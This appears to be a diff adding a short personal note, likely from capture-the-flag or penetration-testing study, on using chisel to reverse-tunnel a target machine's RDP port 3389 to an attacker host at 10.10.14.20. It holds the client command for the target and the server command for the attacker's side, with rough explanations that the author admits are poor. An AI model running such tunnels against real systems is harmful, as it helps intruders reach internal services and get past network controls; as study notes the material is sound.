@@ -1,0 +1,19 @@
+
+on the target machine:
+
+./chisel client 10.10.14.20:4646 R:3389:localhost:3389
+
+what this command is doing:
+	- client arg is forward the connection to your ip and port you want to listen on
+	- R:3389:localhost:3389 ~ this is the localhost port that you want the connection to tunnel to
+	  so to explain it more clearly it is tunneling the port 3389 onto your machine locally
+	
+on your machine:
+
+./chisel server -p 4646 --reverse
+	
+what this command is doing
+	- this is catching the connection being forwarded by the target machine on your yours
+ 	- once you run this command you should now have port 3389 open on your machine
+	- THIS IS PROBABLY A SHITTY WAY OF DESCRIBING CHISEL AND TUNNELING
+	- I recommend looking up a clearer definition online
